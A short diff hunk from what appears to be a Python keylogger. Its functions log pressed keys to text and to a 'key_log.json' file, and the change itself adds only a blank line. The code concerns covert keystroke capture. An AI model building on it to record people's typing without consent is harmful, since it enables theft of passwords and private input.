@@ -15,6 +15,7 @@ def generate_text_log(key):
 def generate_json_file(keys_used):
     with open('key_log.json', 'w') as key_log:
         json.dump(keys_used, key_log)
+        
 
 
 def on_press(key):
